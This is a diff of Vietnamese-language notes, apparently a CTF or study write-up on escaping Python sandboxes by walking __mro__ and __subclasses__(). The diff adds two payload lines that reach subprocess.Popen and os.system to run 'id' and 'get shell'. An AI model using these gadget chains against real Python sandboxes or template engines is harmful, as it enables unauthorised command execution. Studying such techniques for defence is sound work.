@@ -11,7 +11,11 @@ khi hàm không có tham số, nó sẽ trả về một danh sách các biến 
 kiểu như xác định các lớp được kế thừa, sau đó sử dụng __subclasses__() để lấy ra tất cả các đối tượng có thể lấy ở thời điểm hiện tại
 <img src="./Pics/subclass.png">
 
-## exploit
+# exploit
 kết hợp những điều trên ta được
-# sử dụng os._wrap_close hoặc subprocess.Popen để get shell
+## sử dụng os._wrap_close hoặc subprocess.Popen để get shell
+```
+Test1.__mro__[2].__subclasses__()[184]('id',shell=True,stdout=-1).communicate()[0].strip()
+Test1.__mro__[2].__subclasses__()[117].__init__.__globals__['system']('id')
+```
 <img src="./Pics/exploit.png">
